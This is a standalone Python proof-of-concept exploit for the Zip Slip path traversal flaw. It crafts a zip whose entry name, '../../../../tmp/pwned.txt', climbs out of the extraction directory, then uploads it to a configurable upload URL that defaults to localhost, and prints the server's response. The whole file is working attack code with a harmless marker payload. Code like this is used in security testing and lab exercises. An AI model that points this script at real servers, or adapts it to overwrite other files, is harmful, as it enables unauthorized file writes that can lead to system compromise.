import zipfile
import os
import requests

# Configuration
UPLOAD_URL = 'http://localhost:3000/upload'  # Change if needed
MALICIOUS_FILENAME = '../../../../tmp/pwned.txt'
MALICIOUS_CONTENT = b'You have been pwned by Zip Slip!\n'
ZIP_NAME = 'malicious.zip'

# Step 1: Create malicious zip file
with zipfile.ZipFile(ZIP_NAME, 'w') as zf:
    zf.writestr(MALICIOUS_FILENAME, MALICIOUS_CONTENT)
print(f"[*] Created malicious zip: {ZIP_NAME} with entry: {MALICIOUS_FILENAME}")

# Step 2: Upload the zip file
files = {'zipfile': (ZIP_NAME, open(ZIP_NAME, 'rb'), 'application/zip')}
try:
    response = requests.post(UPLOAD_URL, files=files, allow_redirects=False)
    print(f"[*] Uploaded zip file to {UPLOAD_URL}")
    print(f"[+] Server responded with status code: {response.status_code}")
    print(f"[+] Response headers: {response.headers}")
    print(f"[+] Response body: {response.text[:200]}")
except Exception as e:
    print(f"[!] Upload failed: {e}")

# Step 3: (Manual) Check if /tmp/pwned.txt exists on the server
print("[!] If the server is vulnerable, /tmp/pwned.txt should now exist on the server!")
